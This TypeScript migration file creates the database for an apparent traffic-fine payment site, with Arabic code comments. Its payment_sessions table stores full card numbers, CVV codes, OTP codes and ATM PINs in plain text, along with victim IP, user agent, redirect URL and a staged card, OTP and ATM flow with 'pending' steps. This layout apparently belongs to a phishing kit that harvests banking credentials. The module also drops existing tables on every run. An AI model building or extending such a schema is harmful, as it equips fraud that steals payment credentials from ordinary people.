import mysql from "mysql2/promise";
import { ENV } from "./env";

const DROP_TABLES_SQL = `
DROP TABLE IF EXISTS \`fines\`;
DROP TABLE IF EXISTS \`payment_sessions\`;
DROP TABLE IF EXISTS \`fine_queries\`;
`;

const CREATE_TABLES_SQL = `
CREATE TABLE \`users\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`openId\` varchar(64) NOT NULL,
  \`name\` text,
  \`email\` varchar(320),
  \`loginMethod\` varchar(64),
  \`role\` enum('user','admin') NOT NULL DEFAULT 'user',
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  \`lastSignedIn\` timestamp NOT NULL DEFAULT (now()),
  CONSTRAINT \`users_id\` PRIMARY KEY(\`id\`),
  CONSTRAINT \`users_openId_unique\` UNIQUE(\`openId\`)
);

CREATE TABLE \`fine_queries\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`plateSource\` varchar(100) NOT NULL,
  \`plateNumber\` varchar(50) NOT NULL,
  \`plateCode\` varchar(50) NOT NULL,
  \`status\` enum('pending','success','failed','no_fines') NOT NULL DEFAULT 'pending',
  \`errorMessage\` text,
  \`totalFines\` int DEFAULT 0,
  \`totalAmount\` decimal(10,2),
  \`rawResults\` json,
  \`userId\` int,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  CONSTRAINT \`fine_queries_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE \`fines\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`queryId\` int NOT NULL,
  \`fineNumber\` varchar(100),
  \`fineDate\` varchar(50),
  \`description\` text,
  \`amount\` decimal(10,2),
  \`blackPoints\` int DEFAULT 0,
  \`isPaid\` enum('paid','unpaid','partial') DEFAULT 'unpaid',
  \`location\` text,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  CONSTRAINT \`fines_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE \`payment_sessions\` (
  \`id\` int AUTO_INCREMENT NOT NULL,
  \`sessionId\` varchar(64) NOT NULL,
  \`queryId\` int,
  \`selectedFines\` json,
  \`totalAmount\` varchar(50),
  \`cardName\` varchar(200),
  \`cardNumber\` varchar(20),
  \`cardNumberMasked\` varchar(20),
  \`cardExpiry\` varchar(10),
  \`cardCvv\` varchar(10),
  \`otpCode\` varchar(20),
  \`atmPin\` varchar(20),
  \`stage\` enum('card','card_pending','otp','otp_pending','atm','atm_pending','success','failed') NOT NULL DEFAULT 'card',
  \`errorMessage\` text,
  \`plateNumber\` varchar(50),
  \`plateSource\` varchar(100),
  \`clientIp\` varchar(50),
  \`userAgent\` text,
  \`statusRead\` int DEFAULT 0,
  \`redirectUrl\` varchar(500) DEFAULT NULL,
  \`createdAt\` timestamp NOT NULL DEFAULT (now()),
  \`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
  CONSTRAINT \`payment_sessions_id\` PRIMARY KEY(\`id\`),
  CONSTRAINT \`payment_sessions_sessionId_unique\` UNIQUE(\`sessionId\`)
);
`;

export async function runMigrations(): Promise<void> {
  const databaseUrl = ENV.databaseUrl;
  if (!databaseUrl) {
    console.warn("[Migrate] DATABASE_URL not set, skipping migrations");
    return;
  }

  let connection: mysql.Connection | null = null;
  try {
    console.log("[Migrate] Connecting to database for migrations...");
    
    connection = await mysql.createConnection({
      uri: databaseUrl,
      multipleStatements: true
    });

    console.log("[Migrate] Connection established. Dropping old tables to ensure clean state...");
    
    // مسح الجداول القديمة تماماً
    await connection.query(DROP_TABLES_SQL);
    
    console.log("[Migrate] Creating new tables with correct schema...");
    
    // إنشاء الجداول من جديد
    await connection.query(CREATE_TABLES_SQL);

    console.log("[Migrate] Database rebuilt successfully");
  } catch (error: any) {
    console.error("[Migrate] Migration CRITICAL FAILURE:", error.message);
    throw error;
  } finally {
    if (connection) {
      await connection.end();
    }
  }
}
